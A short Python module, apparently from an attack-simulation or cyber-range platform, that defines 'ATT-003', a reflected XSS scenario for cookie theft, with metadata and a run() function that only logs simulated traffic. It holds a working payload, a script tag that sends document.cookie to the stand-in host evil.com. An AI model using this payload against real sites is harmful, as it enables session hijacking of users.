"""ATT-003: XSS-反射型（Cookie窃取）"""
import time
SCRIPT_META = {"id":"ATT-003","name":"XSS-反射型","version":"1.0.0","category":"web_vuln","mitre_tactic":"TA0001","cwe":["CWE-79"],"severity":"medium","target_node_types":["web-server"],"blockable_by":["waf"],"traffic_pattern":{"protocols":["http"],"port":[80,443],"frequency":"low"},"impact":{"type":"info_disclosure","description":"窃取用户Cookie","visual_effect":"Cookie弹窗"},"tools":["browser"],"customizable":True,"custom_params":[{"name":"cookie_name","type":"string","default":"session"}]}
def run(target_url: str, params: dict, context: dict) -> dict:
    result = {"script_id":"ATT-003","status":"running","logs":[],"evidence":[],"traffic_generated":[]}
    payload = "<script>document.location='http://evil.com/c?'+document.cookie</script>"
    result["logs"].append(f"[*] 目标: {target_url}/search?q=")
    result["logs"].append(f"[*] 注入反射型XSS payload...")
    time.sleep(0.3)
    result["traffic_generated"].append({"method":"GET","url":f"{target_url}/search?q={payload}","is_attack":True})
    result["logs"].append(f"[+] XSS Payload已嵌入响应页面")
    result["logs"].append(f"[+] 受害者访问该URL将泄露Cookie")
    result["evidence"].append({"type":"payload","data":payload,"description":"XSS Payload"})
    result["status"]="success"; return result
